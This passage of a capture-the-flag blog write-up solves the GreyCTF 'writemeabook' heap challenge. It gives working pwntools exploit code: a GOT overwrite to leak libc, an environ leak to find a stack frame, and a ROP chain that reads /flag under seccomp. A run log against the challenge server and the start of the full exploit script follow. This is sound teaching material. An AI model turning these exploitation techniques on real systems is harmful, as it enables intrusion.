<p>Leaking libc is very easy given we already setup the entries of <code>@books</code>. We can replace <code>free@GOT</code> by <code>puts@plt</code>. This way the next time free will be called on an entry, it will leak the datas towards which the entry points. Which means <code>free(book[1])</code> leaks the address of stdout within the libc.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">STDOUT</span> <span class="o">=</span> <span class="mh">0x21a780</span>

<span class="c1"># [...]</span>

<span class="k">def</span> <span class="nf">libc_leak_free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="n">STDOUT</span>

<span class="c1"># [...]</span>

<span class="c1"># libc leak</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak_free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="leaking-the-stack">
        Leaking the stack
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#leaking-the-stack" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leaking the stack" href="#leaking-the-stack">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Leaking the libc is cool but given the binary has a seccomp we cannot write one_gadgets on <code>__malloc_hook</code> or <code>__free_hook</code> or within the GOT (of the libc or of the binary) because of the seccomp. We have to do a ROPchain, to do so we could use <code>setcontext</code> but for this libc it is made around <code>rdx</code> that we do not control. Or we could simply leak <code>environ</code> to get the address of a stackframe from which we could return. That&rsquo;s what we gonna do on the <code>rewrite_books</code> stackframe.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">leak_environ</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>

<span class="c1"># leak stack (environ)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
        <span class="c1"># 1==</span>
        <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
        <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">environ</span> <span class="c1"># target</span>
    <span class="p">],</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>

<span class="n">environ</span> <span class="o">=</span> <span class="n">leak_environ</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">stackframe_rewrite</span> <span class="o">=</span> <span class="n">environ</span> <span class="o">-</span> <span class="mh">0x150</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stackframe_rewrite: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stackframe_rewrite</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="ropchain">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Everything is ready for the ROPchain, we cannot use mprotect to use a shellcode within the seccomp forbids it. We just have to set the first entry to the stackframe we&rsquo;d like to hiijack and that&rsquo;s it, then we just need call edit on this entry and the ROPchain is written and triggered at the return of the function!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">base</span><span class="o">=</span><span class="n">stackframe_rewrite</span><span class="p">)</span>

<span class="c1"># setup the write to the rewrite stackframe</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
        <span class="c1"># 1==</span>
        <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
        <span class="n">stackframe_rewrite</span> <span class="c1"># target</span>
    <span class="p">],</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>

<span class="c1"># ROPchain</span>
<span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_open</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="n">stackframe_rewrite</span> <span class="o">+</span> <span class="mh">0xde</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">O_RDONLY</span><span class="p">)</span> <span class="c1"># open</span>
<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
<span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">rdx</span><span class="o">=</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># file descriptor bf ...</span>
<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>

<span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">rdx</span><span class="o">=</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># write</span>
<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/flag</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>

<span class="c1"># write and trigger the ROPchain</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Finally:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">nasm@off:~/Documents/pwn/greycat/writemeabook/dist$ python3 exploit.py REMOTE <span class="nv">HOST</span><span class="o">=</span>34.124.157.94 <span class="nv">PORT</span><span class="o">=</span><span class="m">12346</span>
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist/chall&#39;</span>                                                                                                 
    Arch:     amd64-64-little  
    RELRO:    Partial RELRO
    Stack:    Canary found                                                                                                                 
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x3fd000<span class="o">)</span>                                                                                                                      
    RUNPATH:  b<span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist&#39;</span>                                       
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&#39;</span>                            
    Arch:     amd64-64-little                                                                                   
    RELRO:    Partial RELRO                                                                                                                
    Stack:    Canary found                                                                                                                   
    NX:       NX enabled                                                                                                                        
    PIE:      PIE enabled                                                                                                                         
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2&#39;</span> 
    Arch:     amd64-64-little                                                                        
    RELRO:    Partial RELRO                                                                                                                
    Stack:    No canary found                                                                                                                
    NX:       NX enabled                                                                                                                     
    PIE:      PIE enabled                                                                                                                         
<span class="o">[</span>+<span class="o">]</span> Opening connection to 34.124.157.94 on port 12346: Done                                                                               
<span class="o">[</span>+<span class="o">]</span> heap: 0x81a000                                                                                          
<span class="o">[</span>*<span class="o">]</span> Encrypted fp: 0x40484d
<span class="o">[</span>+<span class="o">]</span> libc: 0x7f162182f000                                                                                                                           
<span class="o">[</span>+<span class="o">]</span> environ: 0x7ffe60582c98
<span class="o">[</span>+<span class="o">]</span> stackframe_rewrite: 0x7ffe60582b48
<span class="o">[</span>*<span class="o">]</span> Loaded <span class="m">218</span> cached gadgets <span class="k">for</span> <span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&#39;</span>
0x7ffe60582b48:   0x7f1621874eb0 pop rax<span class="p">;</span> ret                     
0x7ffe60582b50:              0x2 SYS_open
0x7ffe60582b58:   0x7f162185ae51 pop rsi<span class="p">;</span> ret
0x7ffe60582b60:              0x0 O_RDONLY
0x7ffe60582b68:   0x7f16218593e5 pop rdi<span class="p">;</span> ret
0x7ffe60582b70:   0x7ffe60582c28 <span class="o">(</span>+0xb8<span class="o">)</span>
0x7ffe60582b78:   0x7f16218c0396 syscall<span class="p">;</span> ret
0x7ffe60582b80:   0x7f16218bf528 pop rax<span class="p">;</span> pop rdx<span class="p">;</span> pop rbx<span class="p">;</span> ret
0x7ffe60582b88:              0x0 SYS_read
0x7ffe60582b90:            0x100
0x7ffe60582b98:      b<span class="s1">&#39;uaaavaaa&#39;</span> &lt;pad rbx&gt;
0x7ffe60582ba0:   0x7f162185ae51 pop rsi<span class="p">;</span> ret
0x7ffe60582ba8:         0x81a000
0x7ffe60582bb0:   0x7f16218593e5 pop rdi<span class="p">;</span> ret
0x7ffe60582bb8:              0x3
0x7ffe60582bc0:   0x7f16218c0396 syscall<span class="p">;</span> ret
0x7ffe60582bc8:   0x7f16218bf528 pop rax<span class="p">;</span> pop rdx<span class="p">;</span> pop rbx<span class="p">;</span> ret
0x7ffe60582bd0:              0x1 SYS_write
0x7ffe60582bd8:            0x100
0x7ffe60582be0:      b<span class="s1">&#39;naaboaab&#39;</span> &lt;pad rbx&gt;
0x7ffe60582be8:   0x7f162185ae51 pop rsi<span class="p">;</span> ret
0x7ffe60582bf0:         0x81a000
0x7ffe60582bf8:   0x7f16218593e5 pop rdi<span class="p">;</span> ret
0x7ffe60582c00:              0x1
0x7ffe60582c08:   0x7f16218c0396 syscall<span class="p">;</span> ret
0x7ffe60582c10:   0x7f16218593e5 pop rdi<span class="p">;</span> ret
0x7ffe60582c18:           0x1337 <span class="o">[</span>arg0<span class="o">]</span> <span class="nv">rdi</span> <span class="o">=</span> <span class="m">4919</span>
0x7ffe60582c20:   0x7f16218745f0 <span class="nb">exit</span>
0x7ffe60582c28:     b<span class="s1">&#39;/flag\x00&#39;</span> b<span class="s1">&#39;/flag\x00&#39;</span>
0xde
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
Your book has been rewritten!

grey<span class="o">{</span>gr00m1ng_4nd_sc4nn1ng_th3_b00ks!!<span class="o">}</span>
<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>04<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>b9<span class="se">\x</span>81<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>b8<span class="se">\x</span>81<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>b1<span class="se">\x</span>81<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>c0<span class="se">\x</span>81<span class="se">\x</span>00<span class="se">\[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
$ <span class="nb">exit</span>
$ 
<span class="o">[</span>*<span class="o">]</span> Closed connection to 34.124.157.94 port <span class="m">12346</span>
<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> sending in interactive
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="conclusion">
        Conclusion
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#conclusion" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Conclusion" href="#conclusion">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>That was a nice medium heap challenge, even though that was pretty classic. You can find the tasks and the exploit <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="annexes">
        Annexes
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#annexes" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Annexes" href="#annexes">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Final exploit (with comments):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;chall&#34;</span>
<span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&#34;</span>
<span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2&#34;</span>

<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
<span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
<span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
<span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
<span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
<span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
<span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
<span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
<span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source /home/nasm/Downloads/pwndbg/gdbinit.py
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">HEAP_OFFT</span> <span class="o">=</span> <span class="mh">0x3d10</span>
<span class="n">CHUNK3_OFFT</span> <span class="o">=</span> <span class="mh">0x3d50</span>
<span class="n">STDOUT</span> <span class="o">=</span> <span class="mh">0x21a780</span>

<span class="k">def</span> <span class="nf">encode_ptr</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="n">offt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="n">offt</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">value</span>

<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="k">def</span> <span class="nf">one_gadget</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
  <span class="k">return</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;one_gadget&#39;</span><span class="p">,</span> <span class="s1">&#39;--raw&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)]</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>

    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="n">flip</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">flip</span><span class="p">)</span>
    
    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Write me a book no more than 32 characters long!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
